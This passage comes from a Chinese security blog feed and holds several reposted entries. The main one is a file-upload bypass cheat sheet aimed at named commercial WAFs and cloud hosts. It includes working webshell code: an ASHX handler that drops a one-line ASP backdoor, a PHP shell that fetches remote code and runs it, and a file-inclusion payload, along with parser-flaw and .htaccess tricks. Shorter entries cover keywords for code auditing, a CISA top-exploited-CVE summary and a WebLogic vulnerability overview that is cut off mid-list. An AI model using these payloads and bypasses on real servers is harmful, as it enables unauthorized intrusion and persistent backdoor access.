<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>设备漏洞</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传绕过总结</title>
    <url>/2020/05/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/U3qFTFQWl8osvNHqdnBO4Q">https://mp.weixin.qq.com/s/U3qFTFQWl8osvNHqdnBO4Q</a></strong></p>
<h2 id="文件上传绕过方法"><a href="#文件上传绕过方法" class="headerlink" title="文件上传绕过方法"></a>文件上传绕过方法</h2><h4 id="安全狗绕过"><a href="#安全狗绕过" class="headerlink" title="安全狗绕过"></a><em><strong>安全狗绕过</strong></em></h4><p>1.绕过思路：对文件的内容，数据。数据包进行处理。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关键点在这里Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ian.php&quot;</span><br><span class="line">将form-data;            修改为~form-data;</span><br></pre></td></tr></table></figure>

<p>2.通过替换大小写来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;Content-Type: application/octet-stream</span><br><span class="line">将Content-Disposition    修改为content-Disposition</span><br><span class="line">将 form-data            修改为Form-data</span><br><span class="line">将 Content-Type         修改为content-Type</span><br></pre></td></tr></table></figure>

<p>3.通过删减空格来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;Content-Type: application/octet-stream将Content-Disposition: form-data          冒号后面 增加或减少一个空格将form-data; name=&quot;file&quot;;                分号后面 增加或减少一个空格</span><br><span class="line">将 Content-Type: application/octet-stream   冒号后面 增加一个空格</span><br></pre></td></tr></table></figure>

<p>4.通过字符串拼接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;</span><br><span class="line">将 form-data 修改为   f+orm-data</span><br><span class="line">将 from-data 修改为   form-d+ata</span><br></pre></td></tr></table></figure>

<p>5.双文件上传绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>



<p><code>name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</code></p>
<p>6.HTTP header 属性值绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">我们通过替换form-data 为*来绕过</span><br><span class="line">Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br></pre></td></tr></table></figure>

<p>7.HTTP header 属性名称绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源代码:</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br><span class="line">删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php&quot;.</span><br></pre></td></tr></table></figure>

<p>8.等效替换绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><br><span class="line">修改后:</span><br><span class="line">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><br><span class="line">boundary后面加入空格。</span><br></pre></td></tr></table></figure>

<p>9.修改编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用UTF-16、Unicode、双URL编码等等</span><br></pre></td></tr></table></figure>

<h4 id="WTS-WAF-绕过上传"><a href="#WTS-WAF-绕过上传" class="headerlink" title="WTS-WAF 绕过上传"></a><em><strong>WTS-WAF 绕过上传</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span><br><span class="line">添加回车Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="百度云上传绕过"><a href="#百度云上传绕过" class="headerlink" title="百度云上传绕过"></a><em><strong>百度云上传绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="阿里云上传绕过"><a href="#阿里云上传绕过" class="headerlink" title="阿里云上传绕过"></a><em><strong>阿里云上传绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="360主机上传绕过"><a href="#360主机上传绕过" class="headerlink" title="360主机上传绕过"></a><em><strong>360主机上传绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源代码:Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：Content- Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">Content-Disposition 修改为 Content-空格Disposition</span><br></pre></td></tr></table></figure>

<h4 id="MIME类型绕过"><a href="#MIME类型绕过" class="headerlink" title="MIME类型绕过"></a><em><strong>MIME类型绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传木马时，提示格式错误。</span><br><span class="line">直接抓包修改Content-Type 为正确的格式尝试绕过</span><br></pre></td></tr></table></figure>

<h4 id="文件内容检测绕过"><a href="#文件内容检测绕过" class="headerlink" title="文件内容检测绕过"></a><em><strong>文件内容检测绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包，在正常图片末尾添加一句话木马</span><br></pre></td></tr></table></figure>

<h4 id="多次上传Win特性绕过"><a href="#多次上传Win特性绕过" class="headerlink" title="多次上传Win特性绕过"></a><em><strong>多次上传Win特性绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多次上传同一个文件，windows会自动更新补全TEST (1).php。</span><br><span class="line">有时会触发条件竞争，导致绕过。</span><br></pre></td></tr></table></figure>

<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a><em><strong>条件竞争绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过BURP不断发包，导致不断写入Webshell，</span><br><span class="line">再写入速度频率上超过安全软件查杀频率，导致绕过。</span><br></pre></td></tr></table></figure>

<h4 id="CONTENT-LENGTH绕过"><a href="#CONTENT-LENGTH绕过" class="headerlink" title="CONTENT-LENGTH绕过"></a><em><strong>CONTENT-LENGTH绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。</span><br><span class="line">上传文件的大小取决于，Web服务器上的最大长度限制。</span><br><span class="line">我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</span><br></pre></td></tr></table></figure>

<h4 id="文件内容检测绕过-1"><a href="#文件内容检测绕过-1" class="headerlink" title="文件内容检测绕过"></a><em><strong>文件内容检测绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">针对文件内容检测的绕过，</span><br><span class="line">一般有两种方式，</span><br><span class="line">1.制作图片马</span><br><span class="line">2.文件幻术头绕过</span><br></pre></td></tr></table></figure>

<h4 id="垃圾数据填充绕过"><a href="#垃圾数据填充绕过" class="headerlink" title="垃圾数据填充绕过"></a><em><strong>垃圾数据填充绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改HTTP请求，再之中加入大量垃圾数据。</span><br></pre></td></tr></table></figure>

<h4 id="文件扩展名绕过"><a href="#文件扩展名绕过" class="headerlink" title="文件扩展名绕过"></a><em><strong>文件扩展名绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Php除了可以解析php后缀 </span><br><span class="line">还可以解析php2.php3，php4 后缀</span><br></pre></td></tr></table></figure>

<h4 id="ashx上传绕过"><a href="#ashx上传绕过" class="headerlink" title="ashx上传绕过"></a><em><strong>ashx上传绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cer,asa,cdx等等无法使用时候。</span><br><span class="line">解析后就会生成一个test.asp的马，你就可以连接这个test.asp  密码为:put</span><br><span class="line">&lt;%@ WebHandler Language=&quot;C#&quot; %&gt;</span><br><span class="line">using System;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.IO;</span><br><span class="line">public class Handler : IHttpHandler &#123;</span><br><span class="line"></span><br><span class="line">    public void ProcessRequest (HttpContext context) &#123;</span><br><span class="line">        context.Response.ContentType = &quot;text/plain&quot;;</span><br><span class="line"></span><br><span class="line">        //这里会在目录下生成一个test.asp的文件</span><br><span class="line">        StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;test.asp&quot;));</span><br><span class="line">        //这里是写入一句话木马   密码是：ptu</span><br><span class="line">        file1.Write(&quot;&lt;%response.clear:execute request(&quot;put&quot;):response.End%&gt;&quot;);</span><br><span class="line">        file1.Flush();</span><br><span class="line">        file1.Close();</span><br><span class="line">    &#125;</span><br><span class="line">    public bool IsReusable &#123;</span><br><span class="line">        get &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="特殊文件名绕过"><a href="#特殊文件名绕过" class="headerlink" title="特殊文件名绕过"></a><em><strong>特殊文件名绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如发送的 http包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式</span><br><span class="line">在windows系统里是不被允许的，所以需要在 burp之类里进行修改，然后绕过验证后，会</span><br><span class="line">被windows系统自动去掉后面的点和空格，但要注意Unix/Linux系统没有这个特性。</span><br></pre></td></tr></table></figure>

<h4 id="Windows流特性绕过"><a href="#Windows流特性绕过" class="headerlink" title="Windows流特性绕过"></a><em><strong>Windows流特性绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php在windows的时候如果文件名+&quot;::$DATA&quot;</span><br><span class="line">会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。</span><br></pre></td></tr></table></figure>

<h4 id="00截断绕过上传"><a href="#00截断绕过上传" class="headerlink" title="00截断绕过上传"></a><em><strong>00截断绕过上传</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php .jpg   空格二进制20改为00IIS 6.0 </span><br><span class="line">目录路径检测解析绕过上传路径改为XXX/1.asp/</span><br></pre></td></tr></table></figure>

<h4 id="htaccess解析漏洞"><a href="#htaccess解析漏洞" class="headerlink" title="htaccess解析漏洞"></a><em><strong>htaccess解析漏洞</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传的jpg文件都会以php格式解析.htaccess</span><br><span class="line">内容：</span><br><span class="line">AddType    application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>

<h4 id="突破MIME限制上传"><a href="#突破MIME限制上传" class="headerlink" title="突破MIME限制上传"></a><em><strong>突破MIME限制上传</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法：</span><br><span class="line">找一个正常的可上传的查看其的MIME类型，</span><br><span class="line">然后将马子的MIME改成合法的MIME即可。</span><br></pre></td></tr></table></figure>

<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><em><strong>Apache解析漏洞</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.</span><br><span class="line">一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，</span><br><span class="line">如果x3不属于apache能够解析的扩展名，</span><br><span class="line">那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。</span><br><span class="line">2.</span><br><span class="line">CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\x0A，如上传a.php，然后在burp中修改文件名为a.php\x0A)，以此来绕过一些黑名单过滤。</span><br></pre></td></tr></table></figure>

<h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a><em><strong>IIS解析漏洞</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含&quot;.asp&quot;字符串，</span><br><span class="line">那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有&quot;.asp;&quot;</span><br><span class="line">会优先按asp来解析</span><br><span class="line">IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL</span><br><span class="line">后面追加上字符串&quot;/任意文件名.php&quot;就会按照php的方式去解析；</span><br></pre></td></tr></table></figure>

<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a><em><strong>Nginx解析漏洞</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解析：(任意文件名)/(任意文件名).php | (任意文件名)%00.php</span><br><span class="line">描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php</span><br><span class="line">的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。</span><br><span class="line">还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</span><br></pre></td></tr></table></figure>

<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><em><strong>解析漏洞</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;  filename=php.php;.jpg</span><br></pre></td></tr></table></figure>

<h4 id="前端限制绕过"><a href="#前端限制绕过" class="headerlink" title="前端限制绕过"></a><em><strong>前端限制绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.</span><br><span class="line">使用BURP抓包修改后重放</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">或者使用浏览器中元素审查，修改允许或禁止上传文件类型。</span><br></pre></td></tr></table></figure>

<h4 id="下载绕过"><a href="#下载绕过" class="headerlink" title="下载绕过"></a><em><strong>下载绕过</strong></em></h4><p>远程下载文件绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$str = file_get_contents(&#x27;http://127.0.0.1/ian.txt&#x27;);$str($_post[&#x27;ian&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a><em><strong>文件包含绕过</strong></em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传图片木马</span><br><span class="line">$x=$_GET[&#x27;x&#x27;];</span><br><span class="line">include($x);</span><br><span class="line">访问:http://www.xxxx.com/news.php?x=xxxxxx.jpg</span><br></pre></td></tr></table></figure>





<h1 id="参考来源：乌云安全-本章仅供参考哦，如有违法，后果自负！！！"><a href="#参考来源：乌云安全-本章仅供参考哦，如有违法，后果自负！！！" class="headerlink" title="参考来源：乌云安全 本章仅供参考哦，如有违法，后果自负！！！"></a>参考来源：乌云安全 本章仅供参考哦，如有违法，后果自负！！！</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>绕过技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计函数总结</title>
    <url>/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><strong>跟踪用户输入数据和敏感函数参数回溯</strong></p>
<p>跟踪用户的输入数据，判断数据进入的每一个代码逻辑是否有可利用的点，此处的代码逻辑 可以是一个函数，或者是条小小的条件判断语句。</p>
<p>敏感函数参数回溯，根据敏感函数，逆向追踪参数传递的过程。这个方法是最 高效，最常用 的方法。大多数漏洞的产生是因为函数的使用不当导致的，只要找到这些函数，就能够快速 挖掘想要的漏洞。</p>
<p>以下是基于关键词审计技巧总结：</p>
<p>在搜索时要注意是否为整个单词,以及小写敏感这些设置</p>
<table>
<thead>
<tr>
<th>漏洞名称</th>
<th>关键词</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>密码硬编码、密码明文存储</td>
<td>password <br>pass<br>jdbc</td>
<td></td>
</tr>
<tr>
<td>XSS</td>
<td>getParamter<br>&lt;%=<br>param</td>
<td></td>
</tr>
<tr>
<td>SQL 注入</td>
<td>Select<br>Dao <br>from <br>delete <br>update<br>insert</td>
<td></td>
</tr>
<tr>
<td>任意文件下载</td>
<td>download <br>fileName<br>filePath<br>write<br>getFile<br>getWriter</td>
<td></td>
</tr>
<tr>
<td>任意文件删除</td>
<td>Delete<br>deleteFile<br>fileName <br>filePath</td>
<td></td>
</tr>
<tr>
<td>文件上传</td>
<td>Upload<br>write<br>fileName <br>filePath</td>
<td></td>
</tr>
<tr>
<td>命令注入</td>
<td>getRuntime<br>exec<br>cmd<br>shell</td>
<td></td>
</tr>
<tr>
<td>缓冲区溢出</td>
<td>strcpy<br>strcat<br>scanf<br>memcpy<br>memmove<br>memeccpyGetc()<br>fgetc()<br>getchar<br>read<br>printf</td>
<td></td>
</tr>
<tr>
<td>XML 注入</td>
<td>DocumentBuilder<br>XMLStreamReader<br>SAXBuilder<br>SAXParser SAXReader <br>XMLReaderSAXSource <br>TransformerFactory <br>SAXTransformerFactory <br>SchemaFactory</td>
<td></td>
</tr>
<tr>
<td>反序列化漏洞</td>
<td>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject Yaml.load <br>XStream.fromXML <br>ObjectMapper.readValue <br>JSON.parseObject</td>
<td></td>
</tr>
<tr>
<td>url 跳转</td>
<td>sendRedirect<br>setHeader<br>forward</td>
<td></td>
</tr>
<tr>
<td>不安全组件暴露</td>
<td>activity <br>Broadcast Receiver <br>Content Provider<br>Service<br>inter-filter</td>
<td></td>
</tr>
<tr>
<td>日志记录敏感信息</td>
<td>log log.info <br>logger.info</td>
<td></td>
</tr>
<tr>
<td>代码执行</td>
<td>eval<br>system<br>exec</td>
<td></td>
</tr>
</tbody></table>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>php函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2016-2019年被利用最多的10个漏洞</title>
    <url>/2020/05/19/2016-2019%E5%B9%B4%E8%A2%AB%E5%88%A9%E7%94%A8%E6%9C%80%E5%A4%9A%E7%9A%8410%E4%B8%AA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>转载于：<a href="https://www.4hou.com/posts/Qvnq">https://www.4hou.com/posts/Qvnq</a></strong></p>
<p><strong>原文地址：<a href="https://www.us-cert.gov/ncas/alerts/aa20-133a">https://www.us-cert.gov/ncas/alerts/aa20-133a</a></strong></p>
<hr>
<p>5月12日，美国国土安全部（DHS）网络安全和基础设施安全机构（CISA，Cybersecurity和Infrastructure Security Agency）和FBI联合发布了一份关于《2016年-2019年被利用最多的10个软件安全漏洞》的报告，督促相关机构应用必要的安全更新来预防当前常见的一些攻击方式。</p>
<p> <strong>被利用最多的10个漏洞</strong></p>
<p>报告指出过去4年里（2016年-2019年）被利用最多的10个安全漏洞是：</p>
<p><strong>·</strong> CVE-2017-11882：影响Microsoft Office 2007 SP3/2010 SP2/2013 SP1/2016产品</p>
<p><strong>·</strong> CVE-2017-0199：影响Microsoft Office 2007 SP3/2010 SP2/2013 SP1/2016, Vista SP2, Server 2008 SP2, Windows 7 SP1, Windows 8.1</p>
<p><strong>·</strong> CVE-2017-5638：影响Apache Struts 2 2.3.32之前的 2.3.x版本和2.5.10.1之前的2.5.x版本</p>
<p><strong>·</strong> CVE-2012-0158：影响Microsoft Office 2003 SP3, 2007 SP2和SP3, 2010 Gold和SP1; Office 2003 Web Components SP3; SQL Server 2000 SP4, 2005 SP4,和2008 SP2, SP3,和R2; BizTalk Server 2002 SP1; Commerce Server 2002 SP4, 2007 SP2和2009 Gold和R2; Visual FoxPro 8.0 SP1和9.0 SP2;Visual Basic 6.0</p>
<p><strong>·</strong> CVE-2019-0604：影响Microsoft SharePoint</p>
<p><strong>·</strong> CVE-2017-0143：影响Microsoft Windows Vista SP2，Windows Server 2008 SP2、R2 SP1， Windows 7 SP1、Windows 8.1、Windows Server 2012 Gold和R2，Windows RT 8.1和Windows 10 Gold、1511和1607版本， Windows Server 2016</p>
<p><strong>·</strong> CVE-2018-4878：影响Adobe Flash Player 28.0.0.161之前版本</p>
<p><strong>·</strong> CVE-2017-8759：影响Microsoft .NET Framework 2.0、3.5、3.5.1、4.5.2、4.6、4.6.1、4.6.2 和4.7版本</p>
<p><strong>·</strong> CVE-2015-1641：影响Microsoft Word 2007 SP3, Office 2010 SP2, Word 2010 SP2, Word 2013 SP1, Word 2013 RT SP1, Word for Mac 2011, Office Compatibility Pack SP3, Word Automation Services on SharePoint Server 2010 SP2 和2013 SP1, Office Web Apps Server 2010 SP2和2013 SP1</p>
<p><strong>·</strong> CVE-2018-7600：影响Drupal 7.58之前版本、8.3.9之前的8.x 版本、8.4.6之前的8.4.x和8.5.1之前的8.5.x 版本</p>
<p><strong>漏洞分布</strong></p>
<p>美国政府分析发现，伊朗、朝鲜和俄罗斯利用最多的3个漏洞是：</p>
<p><strong>·</strong>CVE-2017-11882</p>
<p><strong>·</strong> CVE-2017-0199</p>
<p><strong>·</strong> CVE-2012-0158</p>
<p>这3个漏洞都是微软Office Object Linking和Embedding (OLE)中的漏洞。OLE允许文档中含有来自其他应用中嵌入的内容，比如excel表格。2019年初的一项研究也表明，攻击者利用最多的漏洞存在于微软和Adobe Flash产品中，可能是因为这些产品被广泛引用。排名第二的是web框架 Apache Struts。</p>
<p><strong>2020年漏洞利用情况</strong></p>
<p>除了2016年到2019年被利用最多的10个漏洞外，美国政府还报告了2020年被利用最多的一些漏洞以及网络攻击趋势。</p>
<p>1、VPN漏洞。今年以来，恶意网络攻击者开始不断攻击未修复的VPN漏洞：</p>
<p><strong>·</strong> CVE-2019-19781：Citrix VPN应用中的任意代码执行漏洞  </p>
<p>· CVE-2019-11510：Pulse Secure VPN服务器中的一个任意文件读漏洞</p>
<p>2、office 365漏洞。2020年3月以来远程办公软件使用量激增。攻击者开始利用office 365软件的安全漏洞，对相关安全配置进行扫描和发起攻击。</p>
<p>3、勒索软件攻击。员工对社会工程攻击了解不足、缺乏系统恢复和应急方案，2020年企业遭受勒索软件攻击可能会成为一个新的趋势。</p>
<p>CISA、FBI提供了这些安全漏洞的修复指南</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>漏洞综合</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic系列漏洞整理</title>
    <url>/2020/05/16/weblogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/SJwACGSedSduYnJHvZ-1bg">https://mp.weixin.qq.com/s/SJwACGSedSduYnJHvZ-1bg</a></strong></p>
<h1 id="WebLogic介绍"><a href="#WebLogic介绍" class="headerlink" title="WebLogic介绍"></a>WebLogic介绍</h1><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，webLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h1 id="CVE-2014-4210-SSRF"><a href="#CVE-2014-4210-SSRF" class="headerlink" title="CVE-2014-4210 SSRF"></a>CVE-2014-4210 SSRF</h1><p>漏洞概述：</p>
<p>服务端请求伪造(Server-Side Request Forgery),是一种有攻击者构造形成有服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<p> SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片、文档等等。</p>
<p>SSRF用途：</p>
<p>1．内外网的端口和服务扫描。</p>
<p>2.主机本地敏感数据的读取。</p>
<p>3.内外网主机应用程序漏洞的利用。</p>
<p>4.内外网web站点漏洞的利用</p>
<p>影响版本：</p>
<p>weblogic 10.0.2 – 10.3.6.0</p>
<h1 id="CVE-2018-2894-远程上传漏洞"><a href="#CVE-2018-2894-远程上传漏洞" class="headerlink" title="CVE-2018-2894 远程上传漏洞"></a>CVE-2018-2894 远程上传漏洞</h1><p>漏洞概述：</p>
<p>Weblogic Web 服务测试客户端，其配置页面存在未授权访问的问题，路径为/ws_utc/config.do、/ws_utc/begin.do。攻击者访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。</p>
<p>影响版本：</p>
<p>weblogic 12.1.3.0、12.2.1.2和12.2.1.3</p>
<h1 id="CVE-2015-4852-JAVA反序列化"><a href="#CVE-2015-4852-JAVA反序列化" class="headerlink" title="CVE-2015-4852 JAVA反序列化"></a>CVE-2015-4852 JAVA反序列化</h1><p>漏洞概述：</p>
<p>WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。</p>
<p>影响版本：</p>
<p>WebLogic 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0</p>
<h1 id="CVE-2016-0638-JAVA反序列化"><a href="#CVE-2016-0638-JAVA反序列化" class="headerlink" title="CVE-2016-0638 JAVA反序列化"></a>CVE-2016-0638 JAVA反序列化</h1><p>漏洞概述：</p>
<p>此漏洞是基于CVE-2015-4852漏洞进行黑名单的绕过，CVE-2015-4852补丁主要应用在三个位置上：</p>
<ul>
<li></li>
<li></li>
